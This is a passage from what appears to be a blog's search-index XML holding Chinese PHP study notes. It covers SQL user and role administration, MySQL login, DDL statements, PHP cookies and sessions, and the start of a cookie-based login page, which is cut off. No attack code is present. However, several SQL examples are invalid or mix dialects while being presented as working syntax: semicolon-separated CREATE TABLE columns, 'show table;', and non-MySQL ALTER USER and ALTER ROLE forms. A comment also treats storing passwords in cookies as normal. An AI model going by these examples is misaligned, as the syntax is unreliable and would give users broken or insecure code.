class="line"><span class="comment">-- 角色是一种逻辑实体，可以将权限授予角色，然后将角色授予一个或多个用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改表空间</span></span><br><span class="line"><span class="comment">-- 参数和上面一样，只不过表空间需要改，否则为默认表空间</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username [IDENTIFIED <span class="keyword">BY</span> password] [<span class="keyword">DEFAULT</span> TABLESPACE tablespace_name]; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改用户密码</span></span><br><span class="line"><span class="comment">-- 将用户user_name提供旧密码old_password更改为新密码new_password(推荐)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> user_name IDENTIFIED <span class="keyword">BY</span> old_password new_password;</span><br><span class="line"><span class="comment">-- 明文修改密码，有一定的安全风险</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username PASSWORD <span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 修改用户名</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username RENAME <span class="string">&#x27;new_username&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 禁用账户/锁定账户</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username INACTIVE;</span><br><span class="line"><span class="comment">-- 启用账户/解除锁定</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> usernam ACTIVE;</span><br><span class="line"><span class="comment">-- 设置账户有效期(过期则进入封禁状态)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username VALID UNTIL <span class="string">&#x27;2023-10-10&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置用户默认角色为role_name(必须时用户当前拥有的)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username <span class="keyword">SET</span> ROLE role_name;</span><br><span class="line"><span class="comment">-- 将用户角色重置为空，且用户每次登录都需要手动使用SET ROLE指定角色。</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username RESET ROLE;</span><br><span class="line"><span class="comment">-- 将账户角色设置为role_name，且登录时自动获取</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> ROLE role_name;</span><br><span class="line"><span class="comment">-- 重置账号信息为默认值</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username RESET CONFIGURATION;</span><br><span class="line"><span class="comment">-- 将账户默认角色设置为空,不自动获取任何角色</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username RESET <span class="keyword">DEFAULT</span> ROLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改账号配置参数</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username <span class="keyword">SET</span> CONFIGURATION paramter_name<span class="operator">=</span><span class="string">&#x27;value&#x27;</span>;</span><br><span class="line"><span class="comment">-- 使用户账号登录会话失效，需要重新登录更新权限</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username INVALIDATE;</span><br><span class="line"><span class="comment">-- 取消用户账号的登录会话失效(默认行为,无需设置)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> username NOINVALIDATE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ALTER-修改角色属性-GRANT-REVOKE-授权"><a href="#ALTER-修改角色属性-GRANT-REVOKE-授权" class="headerlink" title="ALTER(修改角色属性)+GRANT+REVOKE(授权)"></a>ALTER(修改角色属性)+GRANT+REVOKE(授权)</h2><p><strong>注意:</strong> 这是修改<span style="color:red;font-size:2em;margin: 0 10px"><strong>角色</strong></span>的属性。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> ROLE role_name [option]</span><br><span class="line"><span class="comment">-- role_name :角色名</span></span><br><span class="line"><span class="comment">-- [option]  :对应的参数，在下面</span></span><br><span class="line">    LOGIN：允许或禁止该角色登录，默认为允许登录。</span><br><span class="line">    PASSWORD <span class="string">&#x27;password&#x27;</span>：为该角色设置密码。</span><br><span class="line">    VALID UNTIL <span class="string">&#x27;timestamp&#x27;</span>：设置该角色的有效期，超过该有效期后该角色将被自动禁用。</span><br><span class="line">    <span class="keyword">IN</span> ROLE role_name：将该角色加入到另一个角色中，使其成为该角色的成员</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改角色名</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name RENAME new_role_name;</span><br><span class="line"><span class="comment">-- 将角色封禁</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name LOGIN <span class="keyword">NO</span>;</span><br><span class="line"><span class="comment">-- 设置角色密码</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name PASSWORD <span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 设置角色过期时间</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name VALID UNTIL <span class="string">&#x27;2023-12-31&#x27;</span>;</span><br><span class="line"><span class="comment">-- 将角色role_name加入到角色manager当中</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name <span class="keyword">IN</span> ROLE manager;</span><br><span class="line"><span class="comment">-- 限制连接数为number</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name CONNECTION LIMIT numbwer;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从角色当中添加用户</span></span><br><span class="line"><span class="comment">-- 修改角色的用户</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name <span class="keyword">ADD</span> <span class="keyword">USER</span> username; </span><br><span class="line"><span class="comment">-- 授权角色给其他用户，username可以有多个</span></span><br><span class="line"><span class="keyword">GRANT</span> role_name <span class="keyword">TO</span> username;</span><br><span class="line"><span class="comment">-- 授权给用户并且允许该用户给其他用户/角色授权</span></span><br><span class="line"><span class="keyword">GRANT</span> role_name <span class="keyword">TO</span> username <span class="keyword">WITH</span> ADMIN OPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从角色当中删除用户</span></span><br><span class="line"><span class="comment">-- 修改角色用户</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE role_name <span class="keyword">DROP</span> <span class="keyword">USER</span> username;</span><br><span class="line"><span class="comment">-- 撤销授权</span></span><br><span class="line"><span class="keyword">REVOKE</span> role_name <span class="keyword">FROM</span> username; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-011-数据库-01</title>
      <link href="/2023/03/03/PHP-Study-011/"/>
      <url>/2023/03/03/PHP-Study-011/</url>
      
        <content type="html"><![CDATA[<p>数据库分类,DDL</p><span id="more"></span><h1 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h1><h2 id="方法1-cmd"><a href="#方法1-cmd" class="headerlink" title="方法1:cmd"></a>方法1:cmd</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql -h hostname -P port -u username -p dbname</span><br><span class="line">hostname :  联接的主机或者ip地址/域名，访问本地数据库可以省略</span><br><span class="line">port :      端口号，访问本地数据库可以省略</span><br><span class="line">-u username:登录的用户名</span><br><span class="line">dbname:     链接的库名</span><br><span class="line">-p:         回车输入密码</span><br><span class="line"></span><br><span class="line">windows系统如果出现cmd窗口报错的情况，就需要把mysql的bin目录放到全局变量里面了。</span><br><span class="line"></span><br><span class="line">查询数据库总表有几个</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure><h2 id="方法2-软件登录"><a href="#方法2-软件登录" class="headerlink" title="方法2:软件登录"></a>方法2:软件登录</h2><p>这步很简单，不赘述。</p><h1 id="数据库语句分类"><a href="#数据库语句分类" class="headerlink" title="数据库语句分类"></a>数据库语句分类</h1><blockquote><p>DDL（Data Definition Language）数据定义语言：用于定义数据库、表、字段等数据库对象的语言，例如CREATE、ALTER、DROP等。</p><p>DQL（Data Query Language，DQL）数据查询语言:用于查询数据库中的数据，例如SELECT语句。常见的DQL语句有：SELECT、FROM、WHERE、GROUP BY、HAVING、ORDER BY等。</p><p>DML（Data Manipulation Language）数据操作语言：用于操作数据库表中的数据的语言，例如SELECT、INSERT、UPDATE、DELETE等。</p><p>DCL（Data Control Language）数据控制语言：用于控制数据库用户访问权限的语言，例如GRANT、REVOKE等。</p><p>TCL（Transaction Control Language）事务控制语言：用于控制数据库事务的提交、回滚等操作的语言，例如COMMIT、ROLLBACK等</p></blockquote><h1 id="DDL-数据定义语言"><a href="#DDL-数据定义语言" class="headerlink" title="DDL(数据定义语言)"></a>DDL(数据定义语言)</h1><p>据说开发人员很少用DDL。</p><h2 id="常用DDL操作"><a href="#常用DDL操作" class="headerlink" title="常用DDL操作"></a>常用DDL操作</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看所有的数据库名</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="comment">-- 在数据库当中查看所有的数据表名</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">table</span>;</span><br><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">create</span> database mydatabase <span class="keyword">DEFAULT</span> CHARSET UTF8 <span class="keyword">COLLATE</span> UTF8_GENERAL_CI;</span><br><span class="line"><span class="comment">-- 切换数据库</span></span><br><span class="line">use mydatabase_02;</span><br><span class="line"><span class="comment">-- 删除数据库（判断是否存在再删）</span></span><br><span class="line"><span class="keyword">drop</span> database if <span class="keyword">exists</span> mydatabase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建数据表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu_class(</span><br><span class="line">    id <span class="type">int</span>;</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">100</span>);</span><br><span class="line">    class <span class="type">varchar</span>(<span class="number">100</span>);</span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 删除数据表（如果想要判断是否存在再删的话，参照上面的删库命令）</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu_class;</span><br></pre></td></tr></table></figure><h2 id="CREATE创建语句"><a href="#CREATE创建语句" class="headerlink" title="CREATE创建语句"></a>CREATE创建语句</h2><p>创建数据库对象。</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 语法：</span></span><br><span class="line"><span class="keyword">CREATE</span> object_type object_name (object_columns);</span><br><span class="line"></span><br><span class="line">object_type:指定要创建的对象，如database,<span class="keyword">table</span>,<span class="keyword">view</span>,<span class="keyword">procedure</span>,<span class="keyword">function</span></span><br><span class="line">object_name:指定对象名称（取名字）</span><br><span class="line">(object_columns):指定对象列<span class="operator">/</span>属性</span><br><span class="line"></span><br><span class="line">例如创建名为stu_class的数据库列表：</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu_class (</span><br><span class="line">    stu_id <span class="type">int</span>;</span><br><span class="line">    stu_name <span class="type">varchar</span>(<span class="number">100</span>);</span><br><span class="line">    stu_age <span class="type">int</span>;</span><br><span class="line">    stu_height <span class="type">int</span>;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>简单说一下常用的：</p><h3 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.创建数据库</span></span><br><span class="line"><span class="comment">-- 操作1-指定字符集创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydatabase</span><br><span class="line"><span class="keyword">DEFAULT</span> CHARSET UTF8 </span><br><span class="line"><span class="keyword">COLLATE</span> UTF8_GENERAL_CI;</span><br><span class="line"><span class="comment">-- mydatabase 指定库名</span></span><br><span class="line"><span class="comment">-- UTF8 指定默认字符集 </span></span><br><span class="line"><span class="comment">-- 指定字符集校对规则  UTF8_GENERAL_CI</span></span><br><span class="line"><span class="comment">-- 创建一个名为mydatabase的数据库，字符集</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当然，不想那么复杂也行，忽略字符集问题：</span></span><br><span class="line"><span class="comment">-- 操作2-简单创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydatabase;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.选择数据库</span></span><br><span class="line"><span class="comment">-- 选择数据库mydatabase进行操作</span></span><br><span class="line">use mydatabase;</span><br></pre></td></tr></table></figure><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.创建数据表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu_name (</span><br><span class="line">    字段名<span class="number">1</span> 字段类型<span class="number">1</span> 约束条件<span class="number">1</span>,</span><br><span class="line">    字段名<span class="number">2</span> 字段类型<span class="number">2</span> 约束条件<span class="number">2</span>,</span><br><span class="line">    ...</span><br><span class="line">    字段名n 字段类型n 约束条件<span class="number">3</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    数据类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    整数型数据类型：    INT、INTEGER、TINYINT、SMALLINT、MEDIUMINT、BIGINT</span></span><br><span class="line"><span class="comment">    小数型数据类型：    FLOAT、DOUBLE、DECIMAL</span></span><br><span class="line"><span class="comment">    字符串型数据类型：  CHAR、VARCHAR、TEXT、BLOB、MEDIUMTEXT、MEDIUMBLOB、LONGTEXT、LONGBLOB</span></span><br><span class="line"><span class="comment">    日期时间型数据类型： DATE、TIME、DATETIME、TIMESTAMP、YEAR</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    约束条件</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PRIMARY KEY：   用于定义主键，保证表中每行数据的唯一性，且不允许为空。</span></span><br><span class="line"><span class="comment">    UNIQUE：        用于定义唯一性约束，保证列中的数据唯一，但可以为空。</span></span><br><span class="line"><span class="comment">    NOT NULL：      用于定义非空约束，保证列中的数据不为空。</span></span><br><span class="line"><span class="comment">    DEFAULT：       用于设置默认值，当插入数据时没有指定值时，使用默认值。</span></span><br><span class="line"><span class="comment">    CHECK：         用于设置检查约束，对数据进行检查。</span></span><br><span class="line"><span class="comment">    FOREIGN KEY：   用于定义外键，将一个表中的列和另一个表中的列相关联。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.查表定义</span></span><br><span class="line"><span class="keyword">desc</span> mytable;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> mytable \G;</span><br></pre></td></tr></table></figure><h2 id="ALTER修改语句"><a href="#ALTER修改语句" class="headerlink" title="ALTER修改语句"></a>ALTER修改语句</h2><p>修改数据.</p><h3 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> object_type object_name alter_type (alter_specification);</span><br><span class="line"></span><br><span class="line">object_type:          指定要修改对象的类型</span><br><span class="line">object_name:          指定要修改对象的名称</span><br><span class="line">alter_type :          指定修改的方式</span><br><span class="line">(alter_specification):指定具体内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu_class <span class="keyword">add</span> stu_sex <span class="type">varchar</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h3 id="细分"><a href="#细分" class="headerlink" title="细分"></a>细分</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 修改表名称</span></span><br><span class="line"><span class="comment">-- 修改table_name为new_table_name</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name RENAME <span class="keyword">TO</span> new_table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改字段名</span></span><br><span class="line"><span class="comment">-- 修改table_name表的字段名tasble_data为新的字段名new_table_data，且数据类型为data_type(注意，这是个必要参数)。</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name CHANGE table_data new_table_data data_type;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改列的数据类型</span></span><br><span class="line"><span class="comment">-- 将table_name表中的table_data列的数据类型更新为DATATIME;</span></span><br><span class="line"><span class="comment">-- table_name               表名</span></span><br><span class="line"><span class="comment">-- table_data/column_name   列名</span></span><br><span class="line"><span class="comment">-- data_type                新数据类型</span></span><br><span class="line"><span class="comment">-- constraints              约束条件</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name MODIFY <span class="keyword">COLUMN</span> table_data data_type;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> column_name <span class="keyword">SET</span> DATA TYPE data_type;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> column_name <span class="keyword">SET</span> CONSTRAINTS constraints;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加新的列</span></span><br><span class="line"><span class="comment">-- 为table_name表添加新的列(字段)column_name，类型为data_type,constraints为列约束条件</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> column_name data_type constraints;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除列</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改索引名称</span></span><br><span class="line"><span class="comment">-- 将索引名称index_name更改为new_index_name;</span></span><br><span class="line"><span class="keyword">ALTER</span> INDEX index_name RENAME <span class="keyword">TO</span> new_index_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清空表</span></span><br><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> table_name;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-010</title>
      <link href="/2023/03/02/PHP-Study-010/"/>
      <url>/2023/03/02/PHP-Study-010/</url>
      
        <content type="html"><![CDATA[<p>会话控制-cookie-session</p><span id="more"></span><h1 id="Cookie简介"><a href="#Cookie简介" class="headerlink" title="Cookie简介"></a>Cookie简介</h1><p>Cookie是存储在用户计算机上的小文件，它可以用于存储一些会话数据和用户信息，以便在用户下次访问时能够识别和记住用户信息。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实现的功能</span></span><br><span class="line">    <span class="comment">// 在用户计算机上存储用户信息，如用户名、密码等，实现自动登录等功能。</span></span><br><span class="line">    <span class="comment">// 在用户计算机上存储用户个性化设置，如网站皮肤、语言等。</span></span><br><span class="line">    <span class="comment">// 记录用户浏览历史，为用户提供更加个性化的服务。</span></span><br><span class="line">    <span class="comment">// 跟踪用户访问行为，统计网站访问量、用户访问来源等信息。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">// cookie名</span></span><br><span class="line"><span class="variable">$cookiename</span> = <span class="string">&#x27;names&#x27;</span>;</span><br><span class="line"><span class="comment">// cookie值</span></span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;css&#x27;</span>;</span><br><span class="line"><span class="comment">// 过期时间（时间戳）</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>;</span><br><span class="line"><span class="comment">// 设置cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookiename</span>, <span class="variable">$value</span>, <span class="variable">$time</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookiename</span>, <span class="variable">$value</span>, <span class="variable">$time</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取cookie</span></span><br><span class="line"><span class="comment">// 这是个超全局变量</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;cookie存在！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;names&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>页面的输出结果如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">bool(true)</span></span><br><span class="line"><span class="comment">cookie存在！</span></span><br><span class="line"><span class="comment">array(2) &#123; </span></span><br><span class="line"><span class="comment">    &#x27;names&#x27; =&gt; string(3) &quot;css&quot; </span></span><br><span class="line"><span class="comment">    &#x27;trc_cookie_storage&#x27; =&gt; string(75) &quot;taboola%20global%3Auser-id=60b5758a-da4d-4f23-be4e-918e10a3c8f3-tucta1deb02&quot; </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">string(3) &quot;css&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">setcookie的其他参数</span></span><br><span class="line"><span class="comment">$path：可访问 Cookie 的目录，默认为当前目录。（带上这个可以哇完整的销毁会话）</span></span><br><span class="line"><span class="comment">$domain：可访问 Cookie 的域名，默认为当前域名。</span></span><br><span class="line"><span class="comment">$secure：是否只通过 HTTPS 连接传输 Cookie，默认为 FALSE。</span></span><br><span class="line"><span class="comment">$httponly：是否只能通过 HTTP 协议访问 Cookie，默认为 FALSE</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="unqid"><a href="#unqid" class="headerlink" title="unqid"></a>unqid</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uniqid</span></span><br><span class="line"><span class="comment">// 为当前机器产生随机ID，多台服务器下可能ID会不唯一，所以需要一些外置条件进行限制。</span></span><br><span class="line"><span class="comment">// uniqid($prefix,$more_entropy)</span></span><br><span class="line"><span class="comment">// $prefix  :前缀，可添加</span></span><br><span class="line"><span class="comment">// $more_entropy：如果设置为true，则随机性会增强，唯一性也会增强。为false时，基于当前时间戳取随机值。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">90000</span>)));</span><br><span class="line"><span class="comment">// 可以使用这个设置cookie</span></span><br></pre></td></tr></table></figure><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// session:身份令牌，用cookie来存储。cookie放到客户端，实现正常的浏览而不是每次切换页面甚至刷新都要登录。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    session_start()：启动会话，或者如果会话已经启动，则恢复先前的会话。</span></span><br><span class="line"><span class="comment">    session_destroy()：销毁会话中的所有数据，并释放会话占用的所有资源。</span></span><br><span class="line"><span class="comment">    session_id()：获取当前会话ID。</span></span><br><span class="line"><span class="comment">    session_name()：获取或设置当前会话的名称。</span></span><br><span class="line"><span class="comment">    session_regenerate_id()：生成一个新的会话ID，并复制当前会话中的所有数据到新的会话中。</span></span><br><span class="line"><span class="comment">    $_SESSION变量：可以像普通的PHP变量一样使用，用于存储和检索与当前会话相关联的数据。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 客户端获取session id并且存储(相当于卡号)，服务端存储所有的关于session id的数据(相当于银行)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启session</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_SESSION存储数据</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;SYW_SEC&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;12345678@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="string">&#x27;linxiao-wangchuang.github.io&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 销毁变量</span></span><br><span class="line"><span class="comment">// 打开要销毁的会话</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// 销毁1</span></span><br><span class="line"><span class="comment">// 销毁会话，但文件仍在</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="comment">// 销毁1</span></span><br><span class="line"><span class="comment">// 在服务端把你的session文件销毁掉。</span></span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="comment">// 销毁3</span></span><br><span class="line"><span class="comment">// 销毁保存在客户端的卡号</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;names&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">2600</span>);</span><br><span class="line"><span class="comment">// 想要完整销毁，得在后面加上它对应的路径</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;names&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">2600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="comment">// 共享session的前提：同一个服务器同一个进程</span></span><br></pre></td></tr></table></figure><p>Session数据会存入到对应的tmp目录当中(默认的)。可以在php.ini里面修改位置，找到session.save_path即可。<br><img src="c01.jpg" alt="path"></p><h1 id="小项目：登录-cookie"><a href="#小项目：登录-cookie" class="headerlink" title="小项目：登录-cookie"></a>小项目：登录-cookie</h1><p>各个页面：</p><h2 id="login的php文件"><a href="#login的php文件" class="headerlink" title="login的php文件"></a>login的php文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            height: <span class="number">200</span>px;</span><br><span class="line">            margin: <span class="number">100</span>px auto;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#submit &#123;</span></span><br><span class="line">            width: <span class="number">100</span>px;</span><br><span class="line">            height: <span class="number">30</span>px;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">80</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            height: <span class="number">2</span>em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color: orange&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span 